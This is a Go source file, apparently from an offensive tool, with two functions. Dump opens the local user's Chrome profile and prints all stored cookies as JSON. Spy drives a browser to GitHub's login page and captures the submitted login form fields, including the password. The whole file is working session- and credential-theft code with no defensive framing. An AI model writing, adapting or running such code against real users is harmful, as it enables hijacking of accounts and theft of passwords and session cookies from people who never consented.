package dump

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"runtime"
	"sort"
	"strings"
	"time"

	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/chromedp"
)

const (
	darwinUserDataDir  = "Library/Application Support/Google/Chrome"
	linuxUserDataDir   = ".config/google-chrome"
	windowsUserDataDir = `Google\Chrome\User Data`
)

func getUserDataDir() string {
	var (
		userDataDir string
		home        string
	)

	switch runtime.GOOS {
	case "windows":
		home, _ = os.LookupEnv("LOCALAPPDATA")
		userDataDir = fmt.Sprintf("%s\\%s", home, windowsUserDataDir)
	case "linux":
		home, _ = os.LookupEnv("HOME")
		userDataDir = fmt.Sprintf("%s/%s", home, linuxUserDataDir)
		break
	case "darwin":
		home, _ = os.LookupEnv("HOME")
		userDataDir = fmt.Sprintf("%s/%s", home, darwinUserDataDir)
		break
	}
	return userDataDir
}

// ByDomain sorts a cookie array by domain name
type ByDomain []*network.Cookie

func (a ByDomain) Len() int { return len(a) }
func (a ByDomain) Less(i, j int) bool {
	return a[i].Domain < a[j].Domain
}
func (a ByDomain) Swap(i, j int) {
	a[i], a[j] = a[j], a[i]
}

func toMap(cookies []*network.Cookie) map[string][]*network.Cookie {
	var result map[string][]*network.Cookie = make(map[string][]*network.Cookie)
	for _, cookie := range cookies {
		_, ok := result[cookie.Domain]
		if ok {
			result[cookie.Domain] = append(result[cookie.Domain], cookie)
		} else {
			result[cookie.Domain] = []*network.Cookie{cookie}
		}
	}
	return result
}

func getChromeContext(remoteURL string) (context.Context, context.CancelFunc, context.CancelFunc) {
	var (
		allocCtx context.Context
		cancel   context.CancelFunc
	)
	if remoteURL != "" {
		allocCtx, cancel = chromedp.NewRemoteAllocator(context.Background(), remoteURL)
	} else {
		dir := getUserDataDir()
		opts := []func(*chromedp.ExecAllocator){
			chromedp.Flag("restore-last-session", true),
			chromedp.UserDataDir(dir),
		}
		if runtime.GOOS == "darwin" {
			opts = append(opts,
				chromedp.Flag("headless", false),
				chromedp.Flag("use-mock-keychain", false),
			)
		} else {
			opts = append(opts, chromedp.Headless)
		}
		opts = append(chromedp.DefaultExecAllocatorOptions[:], opts...)
		allocCtx, cancel = chromedp.NewExecAllocator(context.Background(), opts...)
	}
	taskCtx, taskCancel := chromedp.NewContext(allocCtx, chromedp.WithLogf(log.Printf))
	return taskCtx, cancel, taskCancel
}

// Dump Google Chrome's cookies
func Dump(remoteURL string) {
	taskCtx, taskCancel, browserCancel := getChromeContext(remoteURL)
	defer browserCancel()
	defer taskCancel()
	task := chromedp.Tasks{
		chromedp.ActionFunc(func(ctx context.Context) error {
			var pretty bytes.Buffer
			cookies, err := network.GetAllCookies().Do(ctx)
			if err != nil {
				return err
			}
			sort.Sort(ByDomain(cookies))
			mapped := toMap(cookies)
			jsonData, err := json.Marshal(mapped)
			if err != nil {
				return err
			}
			err = json.Indent(&pretty, jsonData, "", "\t")
			if err != nil {
				return err
			}
			fmt.Println(pretty.String())
			return err
		}),
	}
	err := chromedp.Run(taskCtx, task)
	if err != nil {
		log.Fatal(err)
	}
}

// Spy intercepts requests
func Spy(remote string) {
	taskCtx, taskCancel, browserCancel := getChromeContext(remote)
	defer browserCancel()
	defer taskCancel()

	chromedp.ListenBrowser(taskCtx, func(ev interface{}) {
		switch ev.(type) {
		case *network.EventRequestWillBeSent:
			req := ev.(*network.EventRequestWillBeSent)
			if req.Request.Method == "POST" && req.DocumentURL == "https://github.com/session" {
				fmt.Println("Intercepted request:" + req.DocumentURL)
				data := strings.Split(req.Request.PostData, "&")
				for _, l := range data {
					fmt.Println(l)
				}
			}
		}
	})
	chromedp.Run(taskCtx,
		network.Enable(),
		chromedp.Navigate("https://github.com/login"),
		chromedp.Sleep(time.Second*140),
	)
}
